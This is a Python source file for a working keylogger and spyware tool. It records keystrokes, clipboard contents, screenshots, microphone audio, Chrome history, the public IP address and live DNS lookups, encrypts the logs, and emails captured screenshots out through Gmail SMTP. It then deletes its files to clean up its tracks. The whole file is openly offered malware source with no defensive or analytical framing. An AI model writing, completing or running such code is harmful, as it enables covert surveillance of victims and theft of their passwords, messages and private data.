# Import necessary libraries
import os
import platform
from PIL import ImageGrab
import socket
import win32clipboard
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from cryptography.fernet import Fernet
import getpass
import time
from requests import get
import sqlite3
from datetime import datetime, timedelta
from scapy.all import sniff
from scapy.layers.dns import DNSQR
from scipy.io.wavfile import write
import sounddevice as sd

# Define filenames
keys_information_e = "safe_e_log.txt"
system_information_e = "sys_e_nfo.txt"
clipboard_information_e = "secure_e_clip.txt"
screenshot_information = "screenshot.png"
audio_information = "audio.wav"
browser_history_information = "browser_history.txt"
website_visits_information = "website_visits.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Email credentials are now loaded from the environment
email_address = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")

# File path handling to save logs in a consistent place
def get_file_path(filename):
    directory = os.path.join(os.path.expanduser('~'), 'Documents', 'KeyloggerOutput')
    if not os.path.exists(directory):
        os.makedirs(directory)
    return os.path.join(directory, filename)

# Load or generate encryption key
def load_encryption_key():
    key_path = get_file_path('encryption_key.txt')
    try:
        with open(key_path, 'rb') as file:
            key = file.read()
    except FileNotFoundError:
        key = Fernet.generate_key()
        with open(key_path, 'wb') as file:
            file.write(key)
    return key

key = load_encryption_key()
fernet = Fernet(key)

# Email controls
def sendemail(filename, attachment, toaddr):
    frmaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = frmaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Alert"

    body = "Email_Body"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment', filename=filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(frmaddr, password)
    s.sendmail(frmaddr, toaddr, msg.as_string())
    s.quit()

# Encrypt and write data to a file
def encrypt_and_write(data, filename):
    encrypted_data = fernet.encrypt(data.encode())
    with open(filename, "wb") as f:
        f.write(encrypted_data)

# Get computer information and encrypt it
def computer_information():
    system_info = ""
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    try:
        public_ip = get("https://api.ipify.org").text
        system_info += f"Public IP Address: {public_ip}\n"
    except Exception:
        system_info += "Could not get Public IP Address\n"

    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"System: {platform.system()} {platform.version()}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Hostname: {hostname}\n"
    system_info += f"Private IP Address: {IPAddr}\n"

    encrypt_and_write(system_info, get_file_path(system_information_e))

# Get the clipboard contents and encrypt it
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        encrypt_and_write("Clipboard Data: \n" + pasted_data + "\n", get_file_path(clipboard_information_e))
    except:
        encrypt_and_write("Could not copy Clipboard\n", get_file_path(clipboard_information_e))

# Get the microphone recording
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(get_file_path(audio_information), fs, myrecording)

# Screenshot capture with error handling
def screenshot():
    try:
        if platform.system() == 'Windows':
            im = ImageGrab.grab()
            im.save(get_file_path(screenshot_information))
        else:
            print("Screenshots are only supported on Windows.")
    except Exception as e:
        print(f"Error taking screenshot: {e}")

# Retrieve Chrome history and encrypt it
def get_chrome_history():
    history = ""
    if platform.system() == 'Windows':
        history_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'History')
    elif platform.system() == 'Darwin':  # macOS
        history_db = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
    else:  # Linux
        history_db = os.path.expanduser('~/.config/google-chrome/Default/History')

    if os.path.exists(history_db):
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")

        for row in cursor.fetchall():
            url = row[0]
            title = row[1]
            visit_time = row[2]
            visit_time = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
            history += f"Visited URL: {url}\nTitle: {title}\nLast Visit: {visit_time}\n\n"

        conn.close()

    encrypt_and_write(history, get_file_path(browser_history_information))

# Monitor live website visits using DNS traffic
def monitor_website_visits(packet):
    if packet.haslayer(DNSQR):  # DNS Query Request
        domain = packet[DNSQR].qname.decode()
        with open(get_file_path(website_visits_information), "a") as f:
            f.write(f"Website visited: {domain}\n")

# Start network sniffing for live website visits
def start_website_monitoring():
    sniff(filter="port 53", prn=monitor_website_visits, store=False)

# Encrypt and write keylog data
def write_file(keys):
    keylog_data = ""
    for key in keys:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            keylog_data += '\n'
        elif k.find("Key") == -1:
            keylog_data += k

    try:
        encrypt_and_write(keylog_data, get_file_path(keys_information_e))
    except Exception as e:
        print(f"Error writing keylog file: {e}")

# Define listener functions for keylogging
def on_press(key):
    global keys, count, currentTime
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

# Run keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
count = 0
keys = []

while number_of_iterations < number_of_iterations_end:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        screenshot()
        sendemail(screenshot_information, get_file_path(screenshot_information), email_address)

        copy_clipboard()
        get_chrome_history()
        start_website_monitoring()

        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Clean up tracks and delete files
delete_files = [system_information_e, clipboard_information_e, keys_information_e, screenshot_information, audio_information]
for file in delete_files:
    os.remove(get_file_path(file))

# Testing for keylog here